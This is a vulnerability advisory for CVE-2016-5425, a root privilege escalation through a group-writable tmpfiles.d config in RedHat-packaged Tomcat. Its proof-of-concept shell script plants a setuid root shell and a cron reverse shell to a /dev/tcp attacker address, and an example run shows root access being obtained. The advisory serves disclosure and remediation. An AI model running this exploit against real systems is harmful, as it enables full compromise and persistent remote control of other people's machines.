@@ -1,0 +1,283 @@
+=============================================
+- Discovered by: Dawid Golunski
+- http://legalhackers.com
+- dawid (at) legalhackers.com
+
+- CVE-2016-5425 
+- Release date: 10.10.2016
+- Revision: 1
+- Severity: High
+=============================================
+
+
+I. VULNERABILITY
+-------------------------
+
+Apache Tomcat (packaging on RedHat-based distros) - Root Privilege Escalation
+
+
+II. BACKGROUND
+-------------------------
+
+"The Apache TomcatÃ‚Â® software is an open source implementation of the 
+Java Servlet, JavaServer Pages, Java Expression Language and Java WebSocket 
+technologies. The Java Servlet, JavaServer Pages, Java Expression Language 
+and Java WebSocket specifications are developed under the Java Community 
+Process.
+
+The Apache Tomcat software is developed in an open and participatory 
+environment and released under the Apache License version 2. 
+The Apache Tomcat project is intended to be a collaboration of the 
+best-of-breed developers from around the world.
+
+Apache Tomcat software powers numerous large-scale, mission-critical web 
+applications across a diverse range of industries and organizations. 
+Some of these users and their stories are listed on the PoweredBy wiki page.
+"
+
+http://tomcat.apache.org/
+
+
+III. INTRODUCTION
+-------------------------
+
+Apache Tomcat packages provided by default repositories of RedHat-based 
+distributions (including CentOS, RedHat, OracleLinux, Fedora,  etc.) 
+create a tmpfiles.d configuration file with insecure permissions which
+allow attackers who are able to write files with tomcat user permissions
+(for example, through a vulnerability in web application hosted on Tomcat)
+to escalate their privileges from tomcat user to root and fully compromise 
+the target system.
+
+
+IV. DESCRIPTION
+-------------------------
+
+The vulnerability stems from the tomcat.conf file installed by default 
+by packages on RedHat-based systems with write permissions for the tomcat
+group:
+
+[root@centos7 ~]# ls -al /usr/lib/tmpfiles.d/tomcat.conf 
+-rw-rw-r--. 1 root tomcat 361 Oct  9 23:58 /usr/lib/tmpfiles.d/tomcat.conf
+
+The configuration files in tmpfiles.d are used by systemd-tmpfiles to manage 
+temporary files including their creation.
+
+Attackers could very easily exploit the weak permissions on tomcat.conf to 
+inject configuration that creates a rootshell or remote reverse shell that 
+allows them to execute arbitrary commands with root privileges.
+
+Injected malicious settings would be processed whenever 
+/usr/bin/systemd-tmpfiles gets executed. 
+
+systemd-tmpfiles is executed by default on boot on RedHat-based systems
+through systemd-tmpfiles-setup.service service as can be seen below:
+
+
+---[ /usr/lib/systemd/system/systemd-tmpfiles-setup.service ]---
+
+[...]
+ExecStart=/usr/bin/systemd-tmpfiles --create --remove --boot --exclude-prefix=/dev
+
+----------------------------------------------------------------
+
+Depending on the system in use, the execution of systemd-tmpfiles could also 
+be triggered by other services, cronjobs, startup scripts  etc.
+
+
+The vulnerability could potentially get exploited by remote attackers in
+combination with a vulnerable web application hosted on Tomcat if they
+managed to find a path traversal (e.g in a file upload feature) or an arbitrary 
+file write/append vulnerability. This would allow them to append settings
+to /usr/lib/tmpfiles.d/tomcat.conf file and achieve code execution with root
+privileges without a prior local access/shell on the system.
+This vector could prove useful to attackers, for example if they were unable to 
+obtain a tomcat-privileged shell/codeexec by uploading a .jsp webshell through a 
+vulnerable file upload feature due to restrictions imposed by Tomcat security 
+manager, or a read-only webroot etc.
+
+It is worth to note that systemd-tmpfiles does not stop on syntax errors when 
+processing configuration files which makes exploitation easier as attackers only
+need to inject their payload after a new line and do not need to worry 
+about garbage data potentially prepended by a vulnerable webapp in case of
+Arbitrary File Write/Append exploitation.
+
+
+
+V. PROOF OF CONCEPT EXPLOIT
+-------------------------
+
+-----------[ tomcat-RH-root.sh ]---------
+
+#!/bin/bash
+# Apache Tomcat packaging on RedHat-based distros - Root Privilege Escalation PoC Exploit
+# CVE-2016-5425
+#
+# Full advisory at:
+# http://legalhackers.com/advisories/Tomcat-RedHat-Pkgs-Root-PrivEsc-Exploit-CVE-2016-5425.html
+#
+# Discovered and coded by:
+# Dawid Golunski
+# http://legalhackers.com
+#
+# Tested on RedHat, CentOS, OracleLinux, Fedora systems.
+#
+# For testing purposes only.
+#
+
+ATTACKER_IP=127.0.0.1
+ATTACKER_PORT=9090
+
+echo -e "\n* Apache Tomcat (RedHat distros) - Root PrivEsc PoC CVE-2016-5425 *"
+echo -e  "  Discovered by Dawid Golunski\n"
+echo "[+] Checking vulnerability"
+ls -l /usr/lib/tmpfiles.d/tomcat.conf | grep 'tomcat'
+if [ $? -ne 0 ]; then
+	echo "Not vulnerable or tomcat installed under a different user than 'tomcat'"
+	exit 1
+fi
+echo -e "\n[+] Your system is vulnerable!"
+
+echo -e "\n[+] Appending data to /usr/lib/tmpfiles.d/tomcat.conf..."
+cat<<_eof_>>/usr/lib/tmpfiles.d/tomcat.conf
+C /usr/share/tomcat/rootsh 4770 root root - /bin/bash
+z /usr/share/tomcat/rootsh 4770 root root -
+F /etc/cron.d/tomcatexploit 0644 root root - "* * * * * root nohup bash -i >/dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0<&1 2>&1 & \n\n"
+_eof_
+
+echo "[+] /usr/lib/tmpfiles.d/tomcat.conf contains:"
+cat /usr/lib/tmpfiles.d/tomcat.conf
+echo -e "\n[+] Payload injected! Wait for your root shell...\n"
+echo -e "Once '/usr/bin/systemd-tmpfiles --create' gets executed (on reboot by tmpfiles-setup.service, by cron, by another service etc.), 
+the rootshell will be created in /usr/share/tomcat/rootsh. 
+Additionally, a reverse shell should get executed by crond shortly after and connect to $ATTACKER_IP:$ATTACKER_PORT \n"
+
+
+--------------[ eof ]--------------------
+
+
+Example run:
+
+-bash-4.2$ rpm -qa | grep -i tomcat
+tomcat-7.0.54-2.el7_1.noarch
+
+-bash-4.2$ cat /etc/redhat-release 
+CentOS Linux release 7.2.1511 (Core) 
+
+-bash-4.2$ id
+uid=91(tomcat) gid=91(tomcat) groups=91(tomcat) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+
+-bash-4.2$ ./tomcat-RH-root.sh 
+
+* Apache Tomcat (RedHat distros) - Root PrivEsc PoC CVE-2016-5425 *
+  Discovered by Dawid Golunski
+
+[+] Checking vulnerability
+-rw-rw-r--. 1 root tomcat 43 Oct 10 02:39 /usr/lib/tmpfiles.d/tomcat.conf
+
+[+] Your system is vulnerable!
+
+[+] Appending data to /usr/lib/tmpfiles.d/tomcat.conf...
+[+] /usr/lib/tmpfiles.d/tomcat.conf contains:
+f /var/run/tomcat.pid 0644 tomcat tomcat -
+C /usr/share/tomcat/rootsh 4770 root root - /bin/bash
+z /usr/share/tomcat/rootsh 4770 root root -
+F /etc/cron.d/tomcatexploit 0644 root root - "* * * * * root nohup bash -i >/dev/tcp/127.0.0.1/9090 0<&1 2>&1 & \n\n"
+
+[+] Payload injected! Wait for your root shell...
+
+Once '/usr/bin/systemd-tmpfiles --create' gets executed (on reboot by tmpfiles-setup.service, by cron, by another service etc.), 
+the rootshell will be created in /usr/share/tomcat/rootsh. 
+Additionally, a reverse shell should get executed by crond shortly after and connect to 127.0.0.1:9090 
+
+-bash-4.2$ nc -l -p 9090
+bash: no job control in this shell
+[root@centos7 ~]# id
+id
+uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:system_cronjob_t:s0-s0:c0.c1023
+
+[root@centos7 ~]# ls -l /usr/share/tomcat/rootsh
+ls -l /usr/share/tomcat/rootsh
+-rwsrwx---. 1 root root 960392 Aug  2 12:00 /usr/share/tomcat/rootsh
+[root@centos7 ~]# 
+
+
+
+VI. BUSINESS IMPACT
+-------------------------
+
+Attackers who have gained access to tomcat user account or the ability to
+write files as tomcat user could escalate their privileges to root and fully 
+compromise the affected system.
+
+As explained in section IV., the vulnerability could potentially get exploited
+by remote attackers in combination with certain web application vulnerabilities
+to achieve command execution without prior shell access.
+
+ 
+VII. SYSTEMS AFFECTED
+-------------------------
+
+Multiple versions of Tomcat packages on RedHat-based systems are affected.
+
+The vulnerability was confirmed on Tomcat installed from default repositories
+on the following systems:
+
+- CentOS
+- Fedora
+- Oracle Linux
+- RedHat
+
+Refer to information provided by your distribution to obtain an exact list
+of vulnerable packages.
+
+
+Detailes provided by RedHat can be found at:
+
+https://access.redhat.com/security/cve/CVE-2016-5425
+ 
+
+VIII. SOLUTION
+-------------------------
+
+Adjust permissions on /usr/lib/tmpfiles.d/tomcat.conf file to remove write
+permission for the tomcat group.
+
+Alternatively, update to the latest packages provided by your distribution.
+Confirm the file permissions after the update.
+
+ 
+IX. REFERENCES
+-------------------------
+
+http://legalhackers.com
+
+http://legalhackers.com/advisories/Tomcat-RedHat-Pkgs-Root-PrivEsc-Exploit-CVE-2016-5425.html
+
+The source code of the exploit (tomcat-RH-root.sh) can be downloaded from:
+http://legalhackers.com/exploits/tomcat-RH-root.sh
+
+CVE-2016-5425
+http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5425
+
+https://access.redhat.com/security/cve/CVE-2016-5425
+
+
+X. CREDITS
+-------------------------
+
+The vulnerability has been discovered by Dawid Golunski
+dawid (at) legalhackers (dot) com
+http://legalhackers.com
+ 
+XI. REVISION HISTORY
+-------------------------
+
+10.10.2016 - Advisory released
+ 
+XII. LEGAL NOTICES
+-------------------------
+
+The information contained within this advisory is supplied "as-is" with
+no warranties or guarantees of fitness of use or otherwise. I accept no
+responsibility for any damage caused by the use or misuse of this information.
